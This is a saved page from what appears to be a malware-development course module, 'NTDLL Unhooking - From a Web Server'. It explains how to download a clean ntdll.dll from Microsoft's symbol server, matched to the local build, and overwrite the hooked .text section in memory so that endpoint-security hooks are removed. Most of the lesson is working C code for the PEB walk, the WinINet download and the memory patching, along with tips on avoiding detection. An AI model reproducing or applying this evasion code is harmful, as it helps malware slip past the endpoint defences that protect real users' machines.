<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/css2.css" rel="stylesheet">
        <link href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/css2_002.css" rel="stylesheet">
        <title>NTDLL Unhooking - From a Web Server</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 87 - NTDLL Unhooking - From a Web Server
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/ServerUnhooking" target="_blank">
                    <img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>NTDLL Unhooking - From a Web Server</h2>
<h3>Introduction</h3>
<p>By now the reader should have an understanding of several ways to unhook <code>ntdll.dll</code>.
 One may ask, why not simply include a clean version of NTDLL in the 
binary? The issue with that approach is one would need to have several 
versions of NTDLL included in the binary in order to support the 
multiple version of Windows OS. As a result, this would greatly increase
 the size of the implementation, making this a flawed approach.</p>
<p>This module will demonstrate an alternative approach that fetches 
NTDLL from a web server. The implementation will first check the NTDLL 
version on the current machine and fetch the appropriate version of 
NTDLL from the web server. The difficult part of this approach is to 
upload all versions of NTDLL on a web server, therefore in this module, <a href="https://winbindex.m417z.com/" target="_blank">Winbindex</a> will be utilized which contains almost all <code>ntdll.dll</code> versions.</p>
<h3>Winbindex</h3>
<p>Winbindex is a website that contains several versions of files found 
on Windows OS. Additionally, it contains a search utility to search for 
the required file. The image below is the output of searching for the 
64-bit version of <a href="https://winbindex.m417z.com/?file=ntdll.dll" target="_blank">ntdll.dll</a></p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-118739986-88f6cb96-f2b6-4b20-8b93-7d3.png" alt="image"></p>
<h3>Determining Winbindex's URL Format</h3>
<p>Because <code>ntdll.dll</code> must be fetched programmatically, it's important to understand how download links are formatted. Analyze the 3 URLs below:</p>
<ol>
<li>
<p><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll" target="_blank">https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll</a></p>
</li>
<li>
<p><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll" target="_blank">https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll</a></p>
</li>
<li>
<p><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll" target="_blank">https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll</a></p>
</li>
</ol>
<p>Notice how only one part of the URL changes. This is visualized in the following image.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-218741853-fb112eb2-6058-4c09-bf31-636.png" alt="image"></p>
<p>Links 1 &amp; 2 both contain "1ee000" in the URL, which is 2023424 in
 decimal. Viewing the additional information regarding the first NTDLL 
module and searching for the value "2023424" reveals that it's the 
NTDLL's VirtualSize.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-318747866-fb9bb405-fce4-46b1-9797-a07.png" alt="image"></p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-418747883-88d09ac7-5a26-4428-858a-5e3.png" alt="image"></p>
<p>Searching for the first part of the string, "494079D6", which is 
1228962262 in decimal, reveals that this is the timestamp of the file.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-518748318-85fde875-9b04-4087-99d7-991.png" alt="image"></p>
<p>Therefore, the first part of the URL, the timestamp, is derived from the <code>IMAGE_FILE_HEADER.TimeDateStamp</code> element of the DLL. The second part, VirtualSize, is derived from the <code>IMAGE_OPTIONAL_HEADER.SizeOfImage</code> element of the DLL.</p>
<p>Winbindex's download links are visualized in the image below.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-618750624-b5511b03-9f66-42c6-ae0c-826.png" alt="image"></p>
<h3>ReadNtdllFromServer Function</h3>
<p>The next step is to build a function that creates a suitable URL for the local machine. This is what the following <code>ReadNtdllFromServer</code> function does.</p>
<p>The <code>ReadNtdllFromServer</code> function calls <code>FetchLocalNtdllBaseAddress</code> to obtain the base address of the local <code>ntdll.dll</code> image to build the download URL. This is done using <code>wsprintfW</code>
 which combines the string 
"https://msdl.microsoft.com/download/symbols/ntdll.dll/", which is the 
fixed part of the download link with <code>pImgNtHdrs-&gt;FileHeader.TimeDateStamp</code> and <code>pImgNtHdrs-&gt;OptionalHeader.SizeOfImage</code> values.</p>
<p>Once that's done, the function calls <code>GetPayloadFromUrl</code> which was introduced in the <em>Payload Staging - Web Server</em>
 module. This function is responsible for downloading the payload file 
from a web server, but in this case, it's being utilized to download <code>ntdll.dll</code> from the generated link.</p>
<pre><code>#define FIXED_URL	L"https://msdl.microsoft.com/download/symbols/ntdll.dll/"

PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'ServerUnhooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
	
	return pLdr-&gt;DllBase;
}


BOOL ReadNtdllFromServer(OUT PVOID* ppNtdllBuf) {

	PBYTE      pNtdllModule             = (PBYTE)FetchLocalNtdllBaseAddress();
	PVOID      pNtdllBuffer             = NULL;
	SIZE_T     sNtdllSize               = NULL;
	WCHAR      szFullUrl [MAX_PATH]     = { 0 };

	// getting the dos header of the local ntdll image
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// getting the nt headers of the local ntdll image
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// constructing the download url 
	wsprintfW(szFullUrl, L"%s%0.8X%0.4X/ntdll.dll", FIXED_URL, pImgNtHdrs-&gt;FileHeader.TimeDateStamp, pImgNtHdrs-&gt;OptionalHeader.SizeOfImage);

	// 'GetPayloadFromUrl' is used to download a file from a webserver
	if (!GetPayloadFromUrl(szFullUrl, &amp;pNtdllBuffer, &amp;sNtdllSize))
		return FALSE;

	// 'sNtdllSize' will now contain the size of the downloaded ntdll.dll file
	// 'pNtdllBuffer' will now contain the base address of the downloaded ntdll.dll file

	*ppNtdllBuf = pNtdllBuffer;

	return TRUE;
}
</code></pre>
<p>Recall that <code>GetPayloadFromUrl</code> has three parameters, the 
download URL, and two output parameters that represent the base address 
and size of the downloaded file, respectively.</p>
<pre><code>BOOL GetPayloadFromUrl(IN LPCWSTR szUrl, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
			    hInternetFile	= NULL;

	DWORD		dwBytesRead		= NULL;
	
	SIZE_T		sSize			= NULL; 	 			// Used as the total size counter
	
	PBYTE		pBytes			= NULL,					// Used as the total heap buffer counter
			    pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the ntdll file using theURL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole ntdll file bytes
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead &lt; 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pNtdllBuffer   = pBytes;
	*sNtdllSize     = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);         // Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);     // Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);  // Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);                   // Freeing the temp buffer
	return bSTATE;
}
</code></pre>
<h3>Putting It All Together</h3>
<p>Now that an unhooked version of <code>ntdll.dll</code> is in memory, the <code>ReplaceNtdllTxtSection</code> function is utilized to replace the text section of the hooked <code>ntdll.dll</code> with the newly unhooked one. The only modification required is to use the <code>pUnhookedNtdll</code> parameter, which represents the base address of the NTDLL module fetched using the <code>ReadNtdllFromServer</code> function detailed above.</p>
<pre><code>BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID			   pLocalNtdll 	   = (PVOID)FetchLocalNtdllBaseAddress();


	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr 	= (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS 	pLocalNtHdrs 	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID     pLocalNtdllTxt    = NULL, // local hooked text section base address
	          pRemoteNtdllTxt   = NULL; // the unhooked text section base address
	SIZE_T    sNtdllTxtSize     = NULL; // the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
		(ULONG_PTR)pRemoteNtdllTxt += 3072;
		// checking again
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
	}


//---------------------------------------------------------------------------------------------------------------------------

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<p>Even though the ntdll.dll file is <em>read</em> from a WebServer, the offset of the text section can be <code>4096</code>,
 and since this assumption can't be validated until runtime, an 
if-statement is added to verify this possibility and work upon it by 
adding <code>3072</code> bytes to the miscalculated base address (because <code>1024</code> bytes were already added).</p>
<p>The result is a base address of a text section of offset <code>4096</code>. This logic was introduced in the <em>Ntdll Unhooking - From Disk</em> module.</p>
<br>
<h3>Risk Consideration</h3>
<p>Although this NTDLL unhooking approach may appear a good approach at first, it is considered risky due to the usage of the <a href="https://learn.microsoft.com/en-us/windows/win32/wininet/about-wininet" target="_blank">WinINet</a> APIs. These APIs are used to interact with the HTTP/S protocol, but they require loading additional DLL images such as <code>wininet.dll</code>, <code>winhttp.dll</code>, <code>sechost.dll</code>,
 and many other DLLs that export functions used by these WinINet APIs. 
Loading these DLLs is done using functions that are likely being hooked 
such as <code>LoadLibrary</code> and <code>LdrLoadDll</code>, which exposes the inner design of the implementation.</p>
<h3>Demo</h3>
<p>Downloading the <code>ntdll.dll</code> file from Winbindex.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-718816620-fdcedd74-65d6-49a9-b7b8-b83.png" alt="image"></p>
<br>
<p>The hooked <code>ntdll.dll</code> text section to be replaced.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-818817840-42eb37ed-c3fb-4bfc-a990-a79.png" alt="image"></p>
<br>
<p>Miscalculating the text section base address.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-918817843-e8ec2cca-a951-40e3-af75-141.png" alt="image"></p>
<br>
<p>Recalculating the base address.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-10.png" alt="image"></p>
<br>
<p>Replacing the text section.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/ntdll-unhooking-server-11.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Explore the Winbindex site</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reimplement the 'ReplaceNtdllTxtSection' function using direct syscalls</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand the risk of using this method</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/86"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/87/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/87/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/88"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/jquery-3.6.0.min.js"></script>
        <script src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.4474f4d1.css"><link rel="modulepreload" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.5f3af5ce.js"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.4474f4d1.css"><script type="module" src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/app.5f3af5ce.js"></script><script src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/navbar.js"></script>
<script src="NTDLL%20Unhooking%20-%20From%20a%20Web%20Server_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 87;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>